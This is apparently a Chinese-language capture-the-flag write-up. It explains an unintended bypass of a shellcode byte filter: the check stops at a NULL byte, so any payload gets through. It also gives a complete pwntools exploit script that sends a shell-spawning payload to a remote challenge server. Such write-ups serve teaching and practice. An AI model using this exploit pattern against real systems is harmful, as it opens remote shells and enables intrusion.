这题让人比较无语

本来的意图是用给定的字节写shellcode

不过出题人判断逻辑出错了导致直接可以任意字节

```c
  for ( i = buf; *i; ++i )
  {
    for ( j = shellcode; *j && *j != *i; ++j )
      ;
        if ( !*j )
      return 0LL;
```

第一个循环`*i`判断是否为NULL就跳出第二个for中对字节的检查

所以只要前面指令字节带一个\x00的能运行就完了

应该是非预期

```python
from pwn import *
context.arch = 'amd64'
#p = process('./shellcode')
p = remote('34.92.37.22', 10002)
def launch_gdb():
    gdb.attach(p)

shellcode = '\x6a\x00' # jmp 
shellcode += asm(shellcraft.amd64.sh())
p.send(shellcode)
p.interactive()
```



![TIM图片20190429145624.png](https://i.loli.net/2019/04/29/5cc6a1ee57f01.png)